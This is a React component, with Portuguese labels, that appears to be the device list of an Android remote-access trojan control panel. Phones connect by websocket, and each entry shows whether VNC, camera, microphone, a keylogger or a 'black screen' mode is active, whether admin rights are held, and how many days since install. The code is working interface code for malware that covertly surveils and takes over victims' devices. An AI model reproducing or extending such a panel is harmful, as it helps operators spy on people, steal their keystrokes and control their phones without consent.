import useStore from '../../store/index.js';
import DeviceDetail from '../device/DeviceDetail.jsx';

export default function Android() {
  const devices      = useStore(s => s.devices);
  const onlineIds    = useStore(s => s.onlineIds);
  const selectedId   = useStore(s => s.selectedId);
  const selectDevice = useStore(s => s.selectDevice);
  const deviceDetail = useStore(s => s.deviceDetail);

  // Device selected — show detail or loading
  if (selectedId) {
    if (!deviceDetail) {
      return (
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: 200 }}>
          <div className="spin" />
        </div>
      );
    }
    // FIX BUG 6: onBack calls selectDevice(null) which now has a null guard in store
    return <DeviceDetail onBack={() => selectDevice(null)} />;
  }

  const online  = devices.filter(d => onlineIds.has(d.device_id));
  const offline = devices.filter(d => !onlineIds.has(d.device_id));

  return (
    <div className="fade-up">
      <div className="row-sb mb12">
        <div className="section-title" style={{ margin: 0 }}>
          <span className="section-icon">📱</span>Dispositivos Android
        </div>
        <span className="pill pill-green">{online.length} ON</span>
      </div>

      {devices.length === 0 && (
        <div className="no-data" style={{ marginTop: 60 }}>
          <div style={{ fontSize: 48, marginBottom: 12 }}>📱</div>
          <div>Aguardando conexões...</div>
          <div className="txt-xs txt-dim mt8">
            Dispositivos se conectam em ws://HOST:PORT/ws?device_id=X
          </div>
        </div>
      )}

      {online.map(d  => <DeviceItem key={d.device_id} d={d} online onSelect={selectDevice} />)}
      {offline.map(d => <DeviceItem key={d.device_id} d={d} online={false} onSelect={selectDevice} />)}
      <div style={{ height: 20 }} />
    </div>
  );
}

function DeviceItem({ d, online, onSelect }) {
  const ip = (d.ip_address || '').replace(/(\d+)\.(\d+)\.\d+\.\d+/, '$1.$2.***.***');

  const badges = [
    d.vnc_active          && { label: 'VNC',    cls: 'pill-blue'   },
    d.camera_active       && { label: 'CAM',    cls: 'pill-gold'   },
    d.mic_active          && { label: 'MIC',    cls: 'pill-gold'   },
    d.keylogger_active    && { label: 'KEYLOG', cls: 'pill-red'    },
    d.black_screen_active && { label: 'BLACK',  cls: 'pill-dim'    },
    (!d.admin_active && online) && { label: 'NO ADMIN', cls: 'pill-red' },
  ].filter(Boolean);

  return (
    <div className="dev-item" onClick={() => onSelect(d.device_id)}>
      <div className="dev-item-icon">📱</div>
      <div className="dev-item-body">
        <div className="dev-item-name">{d.model || d.device_id}</div>
        <div className="dev-item-sub">
          <span className={`dot ${online ? 'dot-green' : 'dot-red'}`} style={{ marginRight: 5 }} />
          {online ? 'DISPOSITIVO CONECTADO' : 'OFFLINE'}
          {ip && <span style={{ marginLeft: 8, color: 'var(--gold-dark)', fontFamily: 'var(--mono)', fontSize: 11 }}>{ip}</span>}
        </div>
        {badges.length > 0 && (
          <div className="dev-item-badges mt4">
            {badges.map((b, i) => (
              <span key={i} className={`pill ${b.cls}`} style={{ fontSize: 9, padding: '1px 7px' }}>{b.label}</span>
            ))}
          </div>
        )}
      </div>
      <div style={{ textAlign: 'right', flexShrink: 0 }}>
        <div className="txt-xs txt-dim">{d.battery_level || 0}%</div>
        <div className="txt-xs txt-dim mt4">Android {d.android_version || '?'}</div>
        <div className="mt4">
          <span className={`pill ${online ? 'pill-green' : 'pill-dim'}`} style={{ fontSize: 9, padding: '2px 8px' }}>
            {d.days_since_install || 0} dias
          </span>
        </div>
      </div>
    </div>
  );
}
